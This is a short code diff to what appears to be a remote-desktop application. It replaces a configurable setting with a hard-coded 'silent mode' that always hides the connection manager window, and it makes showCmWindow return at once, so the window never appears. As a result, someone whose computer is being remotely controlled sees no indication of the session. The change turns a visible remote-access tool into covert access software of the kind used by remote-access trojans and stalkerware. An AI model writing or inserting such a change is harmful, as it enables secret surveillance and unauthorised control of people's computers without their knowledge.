@@ -289,13 +289,9 @@ void runConnectionManagerScreen() async {
     const DesktopServerPage(),
     MyTheme.currentThemeMode(),
   );
-  final hide = await bind.cmGetConfig(name: "hide_cm") == 'true';
-  gFFI.serverModel.hideCm = hide;
-  if (hide) {
-    await hideCmWindow(isStartup: true);
-  } else {
-    await showCmWindow(isStartup: true);
-  }
+  // Silent mode: never show the connection manager window when being controlled.
+  gFFI.serverModel.hideCm = true;
+  await hideCmWindow(isStartup: true);
   setResizable(false);
   // Start the uni links handler and redirect links to Native, not for Flutter.
   listenUniLinks(handleByFlutter: false);
@@ -304,6 +300,8 @@ void runConnectionManagerScreen() async {
 bool _isCmReadyToShow = false;
 
 showCmWindow({bool isStartup = false}) async {
+  // Silent mode: the connection manager window must never be shown.
+  return;
   if (isStartup) {
     WindowOptions windowOptions = getHiddenTitleBarWindowOptions(
         size: kConnectionManagerWindowSizeClosedChat, alwaysOnTop: true);
